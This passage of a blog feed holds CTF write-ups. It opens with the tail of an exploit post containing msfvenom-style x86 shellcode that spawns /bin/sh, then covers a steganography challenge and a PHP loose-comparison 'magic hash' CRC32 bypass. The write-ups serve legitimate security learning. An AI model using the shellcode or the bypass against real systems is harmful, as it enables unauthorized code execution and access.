<p>We can build our shellcode through using <strong>msfvenom</strong> in msf framework.</p>

<p>This is shellcode i using:</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Combine all of them together and <strong>dd</strong> whatever you want :D</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[FCTF White Steganography Writeup]]></title>
    <link href="http://tungpun.github.io/blog/2015/08/06/fctf-white-steganography-writeup/"/>
    <updated>2015-08-06T18:20:57+00:00</updated>
    <id>http://tungpun.github.io/blog/2015/08/06/fctf-white-steganography-writeup</id>
    <content type="html"><![CDATA[<p>In FCTF, there is a stegno challenge. It&rsquo;s quite simple, but, i had lost so this challenge took me about 40 mins.
This is a reason for me to write about it today.</p>

<p>I have had a &ldquo;white&rdquo; picture:</p>

<p><img src="http://i.imgur.com/2ukiJIf.png" alt="White" /></p>

<p>When face a stegano challenge, the first thought in my mind is check metadata.</p>

<p>I used to use <code>exiftool</code>.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  exiftool 2ukiJIf.png
</span><span class='line'>ExifTool Version Number         : 9.46
</span><span class='line'>File Name                       : 2ukiJIf.png
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 1088 bytes
</span><span class='line'>File Modification Date/Time     : 2015:08:06 22:13:30-04:00
</span><span class='line'>File Access Date/Time           : 2015:08:06 22:16:43-04:00
</span><span class='line'>File Inode Change Date/Time     : 2015:08:06 22:16:43-04:00
</span><span class='line'>File Permissions                : rw-r--r--
</span><span class='line'>File Type                       : PNG
</span><span class='line'>MIME Type                       : image/png
</span><span class='line'>Image Width                     : 300
</span><span class='line'>Image Height                    : 150
</span><span class='line'>Bit Depth                       : 8
</span><span class='line'>Color Type                      : RGB
</span><span class='line'>Compression                     : Deflate/Inflate
</span><span class='line'>Filter                          : Adaptive
</span><span class='line'>Interlace                       : Noninterlaced
</span><span class='line'>SRGB Rendering                  : Perceptual
</span><span class='line'>Gamma                           : 2.2
</span><span class='line'>Pixels Per Unit X               : 3779
</span><span class='line'>Pixels Per Unit Y               : 3779
</span><span class='line'>Pixel Units                     : Meters
</span><span class='line'>Image Size                      : 300x150</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Nothing to do more with exiftool.</p>

<p>I tried viewing the raw data as hex. Too complicated with a pure white image. Is something injected in that file ? or LSB implemented ?
To ensure that, these forensics tools like <code>binwalk</code>, <code>foremost</code> and <code>stegsolve</code> could be useful.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  binwalk 2ukiJIf.png
</span><span class='line'>
</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
</span><span class='line'>--------------------------------------------------------------------------------
</span><span class='line'>0             0x0             PNG image, 300 x 150, 8-bit/color RGB, non-interlaced
</span><span class='line'>91            0x5B            Zlib compressed data, compressed</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>I checked zlib compressed data, but it is not what we need.
Now is your time, foremost !</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  foremost -i 2ukiJIf.png
</span><span class='line'>Processing: 2ukiJIf.png
</span><span class='line'>|*|</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>I also spent ~20mins with StegSolve to ensure that file is not pure white.</p>

<p>Anything i have ignored ?</p>

<blockquote><p>Never give up</p></blockquote>

<p>I wrote a piece of code to highlight the pixel which is not pure white (255, 255, 255)</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python2.7
</span><span class='line'>
</span><span class='line'>import cv2
</span><span class='line'>import numpy as np
</span><span class='line'>
</span><span class='line'>if __name__ == '__main__':
</span><span class='line'>  img = cv2.imread('2ukiJIf.png', 0)  
</span><span class='line'>  s = ''
</span><span class='line'>  for x in range(150):
</span><span class='line'>      for y in range(300):    
</span><span class='line'>          if img[x][y] != 255:                            
</span><span class='line'>              s += '+'
</span><span class='line'>          else:
</span><span class='line'>              s += ' '
</span><span class='line'>      s += '\n'
</span><span class='line'>  f = open("out.txt", "w")
</span><span class='line'>  f.write(s)  </span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Luck me, after openning the out file, i got flag.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>                                                                                                                                                                                                                                                        
</span><span class='line'>                                                                                                                                                                                                                                                                                                        
</span><span class='line'>                                                                                                                                                                                                                                                                                                        
</span><span class='line'>                                                                                                                                                                                                                                                                                                        
</span><span class='line'>                                                                                                                                                                                                                                                                                                        
</span><span class='line'>                                                  ++                                                                       ++                                                                                                      ++                                                                   
</span><span class='line'>                                                  ++                                                                       ++                                                                                                      ++                                                                   
</span><span class='line'>                                                                          ++                                                                                         ++                                                            ++                                                                   
</span><span class='line'>                                                                          ++                                                                                         ++                                                            ++                                                                   
</span><span class='line'>                                                  ++   ++    ++   ++++   +++++           ++++     ++++     ++++            ++   ++++            ++ +++      ++++    +++++            ++++   ++ +++      ++++    ++    ++   +++++++ ++ +++                                                               
</span><span class='line'>                                                  ++   ++    ++  ++   +   ++            ++   +   ++  ++   ++  ++           ++  ++   +           +++  ++    ++  ++    ++             ++  ++  +++  ++    ++  ++   ++    ++  ++   ++  +++  ++                                                              
</span><span class='line'>                                                  ++   ++    ++  ++       ++            ++      ++   ++  ++   ++           ++  ++               ++    ++  ++    ++   ++            ++   ++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
</span><span class='line'>                                                  ++   ++    ++  +++      ++            +++     ++   ++  ++   ++           ++  +++              ++    ++  ++    ++   ++            ++   ++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
</span><span class='line'>                                                  ++   ++    ++   ++++    ++             ++++   +++++++  +++++++           ++   ++++            ++    ++  ++    ++   ++            +++++++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
</span><span class='line'>                                                  ++   ++    ++     +++   ++               +++  ++       ++                ++     +++           ++    ++  ++    ++   ++            ++       ++    ++  ++    ++  ++    ++   +++++   ++    ++                                                             
</span><span class='line'>                                                  ++   ++    ++      ++   ++                ++  ++       ++                ++      ++           ++    ++  ++    ++   ++            ++       ++    ++  ++    ++  ++    ++  ++       ++    ++                                                             
</span><span class='line'>                                                  ++    ++  +++  +   ++   ++            +   ++   ++   +   ++   +           ++  +   ++           ++    ++   ++  ++    ++             ++   +  ++    ++   ++  ++    ++  +++   ++++++  ++    ++                                                             
</span><span class='line'>                                                  ++     +++ ++   ++++     +++           ++++     ++++     ++++            ++   ++++            ++    ++    ++++      +++            ++++   ++    ++    ++++      +++ ++  ++    ++ ++    ++                                                             
</span><span class='line'>                                                  ++                                                                                                                                                                      ++    ++                                                                      
</span><span class='line'>                                                  ++                                                                                                                                                                      ++    ++                                                                      
</span><span class='line'>                                                +++                           +++++++++                          +++++++++            +++++++++                          +++++++++                                         ++++++                                                                       
</span><span class='line'>                                                                                                                                                                                                                                                                                                        
</span><span class='line'>                                                                                                                                                                                                                                                                                                        
</span><span class='line'>                                                                                                                                                                                                                                                                                          
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure></notextile></div>


<p></p>

<p>Quite simple, right ? :D</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[FCTF Easy PHP Writeup]]></title>
    <link href="http://tungpun.github.io/blog/2015/08/06/fctf-easy-php/"/>
    <updated>2015-08-06T13:49:02+00:00</updated>
    <id>http://tungpun.github.io/blog/2015/08/06/fctf-easy-php</id>
    <content type="html"><![CDATA[<p>Last week, when fed my brain with CTF, i faced a web challenge. Luckily, with the help from my friend, i solved it.
This challenge may be easy, but with me, it is interesting and i studied something. So, tonight, i spend my gaming time to explain about this.</p>

<p>My English is terrible, however, i will try with my best.</p>

<p>This challenge give us the url to the web page which have written by php. For personal reason, i can&rsquo;t show it here.</p>

<p>Here we go,
after viewing source, i found the piece of backend code:</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>
</span><span class='line'>    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
</span><span class='line'>    function crc32_string($v){return sprintf("%08x", crc32($v) & 0xffffffff);}
</span><span class='line'>
</span><span class='line'>    $value = (isset($_POST['value']) && is_string($_POST['value'])) ? $_POST['value'] : '';
</span><span class='line'>
</span><span class='line'>    $flag = ($value !== "" && $value !== "ecTmZcC" && crc32_string($value) == crc32_string('ecTmZcC')) ? 'CENSORED': 'bad value';
</span><span class='line'>?&gt;
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>  &lt;head&gt;
</span><span class='line'>    &lt;meta charset="utf-8"&gt;
</span><span class='line'>    &lt;title&gt;For PHP Expert&lt;/title&gt;
</span><span class='line'>  &lt;/head&gt;
</span><span class='line'>  &lt;body&gt;
</span><span class='line'>    &lt;p&gt;
</span><span class='line'>       PHP is a magic language &lt;3. &lt;br&gt;Enter a good value and I'll give you flag ;)
</span><span class='line'>    &lt;/p&gt;
</span><span class='line'>    &lt;form method="POST"&gt;
</span><span class='line'>      &lt;div&gt;Value: &lt;input type="text" name="value" value="&lt;?php echo h($value); ?&gt;"&gt;&lt;/div&gt;
</span><span class='line'>      &lt;br&gt;
</span><span class='line'>      &lt;div&gt;&lt;input type="submit" value="Submit"&gt;&lt;/div&gt;
</span><span class='line'>    &lt;/form&gt;
</span><span class='line'>    &lt;br&gt;
</span><span class='line'>    &lt;?php echo $flag ?&gt;
</span><span class='line'>  &lt;/body&gt;
</span><span class='line'>  &lt;!-- magic.phps --&gt;
</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>As you see, to solve this challenge, we have to find a <code>value</code> , which is not <code>ecTmZcC</code> but its crc32 is equal to <code>ecTmZcC</code>&rsquo;s crc32 :|</p>

<p>Seem like crazy, right ?</p>

<p>Or you can think more positive: is something wrong with  <code>==</code> in php (php is famous for that) ?
The key is <a href="https://blog.whitehatsec.com/magic-hashes/">Magic Hash</a></p>

<p><code>ecTmZcC</code>&rsquo;s crc32 is <code>0e730435</code>. So, we must calculate a value which has crc32 hash similar &lsquo;0eXXXXXX&rsquo; (X is numeric).</p>

<p>I wrote a Python script to find it.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>!#/usr/bin/python2.7
</span><span class='line'>import binascii
</span><span class='line'>
</span><span class='line'>def CRC32(buf):    
</span><span class='line'>    buf = (binascii.crc32(buf) & 0xFFFFFFFF)
</span><span class='line'>    return "%08X" % buf
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>def chk(s, p):
</span><span class='line'>  if s[:2] != p:
</span><span class='line'>      return False
</span><span class='line'>  for c in s[2:]:
</span><span class='line'>      if '0' &lt;= c &lt;= '9':
</span><span class='line'>          ok = 1
</span><span class='line'>      else:
</span><span class='line'>          return False
</span><span class='line'>  return True
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>if __name__ == '__main__':
</span><span class='line'>  pattern = CRC32('ecTmZcC')[:2]  # 0e
</span><span class='line'>  i = 0
</span><span class='line'>  while True:
</span><span class='line'>      if chk(CRC32(str(i)), pattern):         
</span><span class='line'>          print 'value:', i
</span><span class='line'>          break   
</span><span class='line'>      i += 1      </span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Finally, we have the answer: <strong>6586</strong> and got flag :D</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First Post]]></title>
    <link href="http://tungpun.github.io/blog/2015/08/06/first-post/"/>
    <updated>2015-08-06T09:15:43+00:00</updated>
    <id>http://tungpun.github.io/blog/2015/08/06/first-post</id>
    <content type="html"><![CDATA[<blockquote><p>Hello octopress, ruby, rake, markdown, blogging !</p></blockquote>
]]></content>
  </entry>
  
</feed>
